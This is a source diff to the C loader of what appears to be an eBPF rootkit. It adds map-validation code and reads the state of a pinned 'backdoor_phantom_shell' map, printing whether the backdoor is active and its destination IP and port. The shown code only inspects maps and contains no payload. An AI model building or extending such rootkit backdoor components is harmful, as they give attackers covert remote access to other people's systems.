@@ -7,6 +7,7 @@
 #include <linux/if_link.h>
 #include <net/if.h>
 #include <unistd.h>
+#include <locale.h>
 
 #include <bpf/bpf.h>
 
@@ -139,10 +140,59 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 	return 0;
 }
 
+int check_map_fd_info(int map_fd, struct bpf_map_info *info, struct bpf_map_info *exp){
+	__u32 info_len = sizeof(*info);
+	int err;
+
+	if (map_fd < 0)
+		return -1;
+
+	err = bpf_obj_get_info_by_fd(map_fd, info, &info_len);
+	if (err) {
+		fprintf(stderr, "ERR: %s() can't get info - %s\n",
+			__func__,  strerror(errno));
+		return -1;
+	}
+
+	if (exp->key_size && exp->key_size != info->key_size) {
+		fprintf(stderr, "ERR: %s() "
+			"Map key size(%d) mismatch expected size(%d)\n",
+			__func__, info->key_size, exp->key_size);
+		return -1;
+	}
+	if (exp->value_size && exp->value_size != info->value_size) {
+		fprintf(stderr, "ERR: %s() "
+			"Map value size(%d) mismatch expected size(%d)\n",
+			__func__, info->value_size, exp->value_size);
+		return -1;
+	}
+	if (exp->max_entries && exp->max_entries != info->max_entries) {
+		fprintf(stderr, "ERR: %s() "
+			"Map max_entries(%d) mismatch expected size(%d)\n",
+			__func__, info->max_entries, exp->max_entries);
+		return -1;
+	}
+	if (exp->type && exp->type  != info->type) {
+		fprintf(stderr, "ERR: %s() "
+			"Map type(%d) mismatch expected type(%d)\n",
+			__func__, info->type, exp->type);
+		return -1;
+	}
+
+	return 0;
+}
+
+struct backdoor_phantom_shell_data{
+	int active;
+	__u32 d_ip;
+	__u16 d_port;
+};
 
 int main(int argc, char**argv){
     struct ring_buffer *rb = NULL;
     struct kit_bpf *skel;
+	struct bpf_map_info map_expect = { 0 };
+	struct bpf_map_info info = { 0 };
     __u32 err;
 
 	//Ready to be used
@@ -208,12 +258,52 @@ int main(int argc, char**argv){
 		return 1;
 	}
 
+	
+	
 	//Load & verify BPF program
 	err = kit_bpf__load(skel);
 	if (err) {
 		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
 		goto cleanup;
 	}
+
+	int tc_efd = bpf_obj_get("/sys/fs/bpf/tc/globals/backdoor_phantom_shell");
+	printf("TC MAP ID: %i\n", tc_efd);
+	map_expect.key_size    = sizeof(__u64);
+	map_expect.value_size  = sizeof(struct backdoor_phantom_shell_data);
+	map_expect.max_entries = 1;
+	err = check_map_fd_info(tc_efd, &info, &map_expect);
+	if (err) {
+		fprintf(stderr, "ERR: map via FD not compatible\n");
+		return err;
+	}
+	printf("\nCollecting stats from BPF map\n");
+	printf(" - BPF map (bpf_map_type:%d) id:%d name:%s"
+			" key_size:%d value_size:%d max_entries:%d\n",
+			info.type, info.id, info.name,
+			info.key_size, info.value_size, info.max_entries
+			);
+	int key = 1;
+	struct backdoor_phantom_shell_data data;
+	err = bpf_map_lookup_elem(tc_efd, &key, &data);
+	if(err<0) {
+		printf("Failed to lookup element\n");
+	}
+	printf("%i, %i, %i\n", data.active, data.d_ip, data.d_port);
+
+	/*bpf_obj_get(NULL);
+	char* DIRECTORY_PIN = "/sys/fs/bpf/mymaps";
+	err = bpf_object__unpin_maps(skel->obj, DIRECTORY_PIN);
+	if (err) {
+		fprintf(stderr, "ERR: UNpinning maps in %s\n",DIRECTORY_PIN);
+		//return -1;
+	}
+	err = bpf_object__pin_maps(skel->obj, DIRECTORY_PIN);
+	if (err) {
+		fprintf(stderr, "ERR: pinning maps in %s\n",DIRECTORY_PIN);
+		return -1;
+	}
+	bpf_map__pin(skel->maps.backdoor_phantom_shell, DIRECTORY_PIN);*/
 
 	//Attach XDP and sched modules using module manager
 	//and setup the parameters for the installation
